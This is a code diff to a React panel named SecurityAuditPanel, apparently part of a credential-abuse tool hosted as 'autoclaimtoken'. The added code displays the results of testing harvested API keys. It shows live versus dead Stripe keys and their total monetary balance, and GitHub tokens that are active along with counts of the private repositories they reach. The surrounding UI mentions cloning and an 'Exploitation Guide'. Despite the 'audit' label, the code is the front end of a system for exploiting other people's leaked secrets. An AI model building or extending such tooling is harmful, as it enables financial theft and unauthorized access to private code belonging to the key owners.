@@ -17,6 +17,7 @@ export default function SecurityAuditPanel() {
   const [totalValue, setTotalValue] = useState(0);
   const [liveProgress, setLiveProgress] = useState([]);
   const [terminalLogs, setTerminalLogs] = useState([]);
+  const [exploitResults, setExploitResults] = useState(null);
 
   const API_URL = process.env.NEXT_PUBLIC_API_URL || 'https://autoclaimtoken.onrender.com';
 
@@ -660,8 +661,8 @@ export default function SecurityAuditPanel() {
                       });
                       const data = await response.json();
                       if (data.success) {
+                        setExploitResults({ type: 'test', data });
                         alert(`Tested ${data.tested} keys\n\nLive: ${data.summary.live}\nDead: ${data.summary.dead}\nActive: ${data.summary.active}`);
-                        console.log('Test results:', data.results);
                       }
                     } catch (error) {
                       alert('Test failed: ' + error.message);
@@ -703,8 +704,8 @@ export default function SecurityAuditPanel() {
                       });
                       const data = await response.json();
                       if (data.success) {
+                        setExploitResults({ type: 'balance', data });
                         alert(`Checked ${data.checked} Stripe keys\n\nLive: ${data.summary.live}\nDead: ${data.summary.dead}\n\nTOTAL BALANCE: $${data.summary.totalValue.toFixed(2)}`);
-                        console.log('Balance results:', data.results);
                       }
                     } catch (error) {
                       alert('Check failed: ' + error.message);
@@ -783,8 +784,8 @@ export default function SecurityAuditPanel() {
                       });
                       const data = await response.json();
                       if (data.success) {
+                        setExploitResults({ type: 'github', data });
                         alert(`Scanned ${data.checked} tokens\n\nActive: ${data.summary.active}\nTotal Private Repos: ${data.summary.totalRepos}`);
-                        console.log('GitHub repos:', data.results);
                       }
                     } catch (error) {
                       alert('Clone failed: ' + error.message);
@@ -802,6 +803,106 @@ export default function SecurityAuditPanel() {
                 </div>
               </div>
             </div>
+
+            {/* Results Display */}
+            {exploitResults && (
+              <div className="mt-6 bg-gray-900 rounded-xl p-6 border border-green-500">
+                <div className="flex items-center justify-between mb-4">
+                  <h3 className="text-white font-bold text-lg">📊 Results</h3>
+                  <button onClick={() => setExploitResults(null)} className="text-gray-400 hover:text-white">✕</button>
+                </div>
+
+                {exploitResults.type === 'balance' && (
+                  <div className="space-y-3">
+                    <div className="bg-green-900/30 border border-green-500 rounded-lg p-4">
+                      <div className="text-green-400 font-bold text-3xl">${exploitResults.data.summary.totalValue.toFixed(2)}</div>
+                      <div className="text-gray-300">Total Balance Available</div>
+                    </div>
+                    <div className="grid grid-cols-3 gap-3">
+                      <div className="bg-gray-800 p-3 rounded-lg text-center">
+                        <div className="text-green-400 font-bold text-2xl">{exploitResults.data.summary.live}</div>
+                        <div className="text-gray-400 text-sm">LIVE</div>
+                      </div>
+                      <div className="bg-gray-800 p-3 rounded-lg text-center">
+                        <div className="text-red-400 font-bold text-2xl">{exploitResults.data.summary.dead}</div>
+                        <div className="text-gray-400 text-sm">DEAD</div>
+                      </div>
+                      <div className="bg-gray-800 p-3 rounded-lg text-center">
+                        <div className="text-blue-400 font-bold text-2xl">{exploitResults.data.checked}</div>
+                        <div className="text-gray-400 text-sm">CHECKED</div>
+                      </div>
+                    </div>
+                    <div className="max-h-96 overflow-y-auto space-y-2">
+                      {exploitResults.data.results.map((r, i) => (
+                        <div key={i} className={`p-4 rounded-lg ${r.status === 'LIVE' ? 'bg-green-900/30 border border-green-500' : 'bg-gray-800'}`}>
+                          <div className="flex items-center justify-between">
+                            <div className="flex-1">
+                              <div className="text-white font-mono text-sm">{r.key}</div>
+                              {r.source && <div className="text-gray-400 text-xs mt-1">{r.source}</div>}
+                            </div>
+                            <div className="text-right">
+                              <div className={`font-bold text-lg ${r.status === 'LIVE' ? 'text-green-400' : 'text-red-400'}`}>{r.status}</div>
+                              {r.balance !== undefined && <div className="text-green-400 font-bold text-xl">${r.balance.toFixed(2)}</div>}
+                            </div>
+                          </div>
+                        </div>
+                      ))}
+                    </div>
+                  </div>
+                )}
+
+                {exploitResults.type === 'test' && (
+                  <div className="space-y-3">
+                    <div className="grid grid-cols-4 gap-3">
+                      <div className="bg-green-900/30 p-3 rounded-lg text-center">
+                        <div className="text-green-400 font-bold text-xl">{exploitResults.data.summary.live}</div>
+                        <div className="text-gray-400 text-xs">LIVE</div>
+                      </div>
+                      <div className="bg-red-900/30 p-3 rounded-lg text-center">
+                        <div className="text-red-400 font-bold text-xl">{exploitResults.data.summary.dead}</div>
+                        <div className="text-gray-400 text-xs">DEAD</div>
+                      </div>
+                      <div className="bg-blue-900/30 p-3 rounded-lg text-center">
+                        <div className="text-blue-400 font-bold text-xl">{exploitResults.data.summary.active}</div>
+                        <div className="text-gray-400 text-xs">ACTIVE</div>
+                      </div>
+                      <div className="bg-gray-800 p-3 rounded-lg text-center">
+                        <div className="text-white font-bold text-xl">{exploitResults.data.tested}</div>
+                        <div className="text-gray-400 text-xs">TESTED</div>
+                      </div>
+                    </div>
+                  </div>
+                )}
+
+                {exploitResults.type === 'github' && (
+                  <div className="space-y-3">
+                    <div className="grid grid-cols-2 gap-3">
+                      <div className="bg-green-900/30 p-4 rounded-lg text-center">
+                        <div className="text-green-400 font-bold text-2xl">{exploitResults.data.summary.active}</div>
+                        <div className="text-gray-300">Active Tokens</div>
+                      </div>
+                      <div className="bg-blue-900/30 p-4 rounded-lg text-center">
+                        <div className="text-blue-400 font-bold text-2xl">{exploitResults.data.summary.totalRepos}</div>
+                        <div className="text-gray-300">Private Repos</div>
+                      </div>
+                    </div>
+                    <div className="max-h-96 overflow-y-auto space-y-2">
+                      {exploitResults.data.results.map((r, i) => (
+                        <div key={i} className="bg-gray-800 p-4 rounded-lg">
+                          <div className="flex items-center justify-between mb-2">
+                            <div className="text-white font-bold text-lg">{r.username}</div>
+                            <div className={`font-bold ${r.status === 'ACTIVE' ? 'text-green-400' : 'text-red-400'}`}>{r.status}</div>
+                          </div>
+                          {r.repos && (
+                            <div className="text-sm text-gray-400">{r.privateRepos} private repos found</div>
+                          )}
+                        </div>
+                      ))}
+                    </div>
+                  </div>
+                )}
+              </div>
+            )}
 
             {/* Exploitation Guide */}
             <div className="mt-6 bg-gray-900 rounded-xl p-6 border border-gray-700">
